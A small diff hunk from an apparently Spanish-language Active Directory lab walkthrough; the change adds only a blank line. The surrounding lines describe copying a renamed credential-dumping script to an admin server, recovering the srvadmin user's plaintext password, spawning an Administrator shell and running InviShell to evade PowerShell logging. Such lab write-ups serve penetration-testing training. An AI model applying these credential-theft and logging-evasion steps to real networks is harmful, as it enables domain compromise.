@@ -584,6 +584,7 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcor
 Obteniendo la credencial del usuario srvadmin en texto plano
 Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador siendo el usuario studen97
 
+
 Una vez dentro ejecutaremos una invishell
 ```shell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
